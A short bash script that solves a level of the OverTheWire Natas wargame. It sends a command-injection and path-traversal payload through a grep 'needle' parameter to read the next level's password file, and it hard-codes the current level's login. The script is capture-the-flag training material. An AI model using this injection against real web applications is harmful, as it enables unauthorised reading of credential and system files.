#!/bin/bash
# This backend takes the input form the user and injects it to the grep command
# we can inject our own commands to search other files
# Payload : . ../../../../../etc/natas_webpass/natas9;
# for grep :
#   .                                           match anything
#   ../../../../../etc/natas_webpass/natas9     file to search
#   ;                                           to 'disable' dictionary.txt

USER=natas9
PASS='ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t'

NEEDLE='. ../../../../../etc/natas_webpass/natas10;'
NEEDLE_ENCODED=$(urlencode $NEEDLE)

echo $NEEDLE
echo $NEEDLE_ENCODED

needle=
curl -fsSL -u $USER:$PASS \
  http://natas9.natas.labs.overthewire.org/index.php?needle=$NEEDLE_ENCODED |
  grep -A 2 "<pre"
